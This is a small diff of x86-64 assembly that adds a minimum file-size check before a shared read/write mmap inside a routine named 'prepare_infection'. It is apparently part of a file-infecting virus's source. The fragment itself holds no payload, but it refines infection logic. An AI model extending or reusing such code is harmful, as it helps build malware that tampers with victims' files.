@@ -639,6 +639,10 @@ prepare_infection:
 	add     rsp, 144
 
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
+	mov		rax, [rel file_size]
+	cmp		rax, 0x1000
+	jb		.close_file
+
 	mov     rax, SYS_mmap
 	xor     rdi, rdi
 	mov     rsi, [rel file_size]
